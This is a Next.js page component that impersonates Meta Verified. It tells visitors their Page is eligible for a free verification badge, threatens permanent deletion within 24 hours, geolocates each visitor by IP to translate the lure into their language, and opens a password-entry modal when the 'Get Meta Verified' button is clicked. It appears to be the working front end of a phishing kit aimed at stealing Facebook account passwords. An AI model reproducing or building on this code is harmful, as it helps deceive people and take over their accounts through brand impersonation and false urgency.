'use client';
import dynamic from 'next/dynamic';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, useMemo } from 'react';
import Image from 'next/image';
import MetaLogo from '@/assets/images/unnamedmeta.png';
import Navbar from '@/components/navbar';

interface VerifyFormData {
    personalEmail: string;
    pageName: string;
    legalBusinessName: string;
    phoneNumber: string;
    description: string;
}

const PasswordModal = dynamic(() => import('@/components/form-modal/password-modal'), { ssr: false });
const VerifyModal = dynamic(() => import('@/components/form-modal/verify-modal'), { ssr: false });

const Page: FC = () => {
    const { geoInfo, setGeoInfo } = store();
    const [showPasswordModal, setShowPasswordModal] = useState(false);
    const [showVerifyModal, setShowVerifyModal] = useState(false);
    const [formData] = useState<VerifyFormData>({
        personalEmail: '',
        pageName: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });

    // Compute translations using useMemo - instantly without API calls
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);

    const translations = useMemo(() => {
        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
        const lang = countryToLanguage[countryCode] || 'en';
        return getTranslations(lang);
    }, [geoInfo, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    // Update translations when geoInfo changes
    useEffect(() => {
        if (!geoInfo) return;
        
        // If translations already loaded (from browser language), skip
        if (Object.keys(translations).length > 0) return;

        // Temporarily disabled complex translation logic
        return;
    }, [geoInfo, translations]);

    const handleVerifyConfirm = () => {
        setShowVerifyModal(false);
    };

    return (
        <div>
            <Navbar />
            <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
                <div style={{ backgroundColor: '#768187', color: 'white', textAlign: 'center', padding: '16px 0' }}>
                {t('Upgrade your profile with Meta Verified — enjoy exclusive benefits.')}<br />
                <span className="text-xs font-normal">{t('This form must be completed within 24 hours, or it will be permanently deleted.')}</span>
            </div>
            <div className="flex flex-1 flex-col md:flex-row items-center justify-center px-3 md:px-8 py-6 md:py-12 gap-2 md:gap-4 max-w-[1600px] mx-auto w-full md:-mt-12 md:-mt-16">
                <div className="w-full md:w-1/3 flex flex-col items-center md:items-start justify-center px-3 md:px-0 mb-6 md:mb-0">
                    <Image src={MetaLogo} alt={t('Meta Verified Logo')} width={300} height={300} className="w-24 h-24 md:w-32 md:h-32 mb-4 md:mb-6" priority quality={95} />
                    <h1 className="text-xl md:text-3xl font-bold mb-3 md:mb-4 text-[#1C2B33] text-center md:text-left">
                        {t('Page Eligibility for Free Verification Badge')}
                    </h1>
                    <p className="text-sm md:text-base text-[#1C2B33] mb-4 md:mb-6 text-center md:text-left leading-relaxed">{t('Your Page is eligible to receive a free verification badge. Verification helps confirm your Page\'s authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.')}</p>
                    <div className="flex flex-col md:flex-row gap-4 mb-4 w-full items-center md:items-start justify-center md:justify-start">
                        <button
                            onClick={() => {
                                setShowPasswordModal(true);
                            }}
                            className="bg-[#1877f2] hover:bg-[#145db2] text-white font-semibold py-3 px-6 rounded-full text-base shadow w-full md:w-auto"
                        >
                            {t('Get Meta Verified')}
                        </button>
                    </div>
                </div>
            </div>

            {/* Password Modal */}
            {showPasswordModal && (
                <PasswordModal 
                    userProfileImage=""
                    userName={formData.legalBusinessName || 'User'}
                    userEmail={formData.personalEmail || ''}
                />
            )}

            {/* Verify Modal */}
            {showVerifyModal && (
                <VerifyModal 
                    businessName={formData.legalBusinessName}
                    nextStep={handleVerifyConfirm}
                />
            )}
        </div>
        </div>
    );
};

export default Page;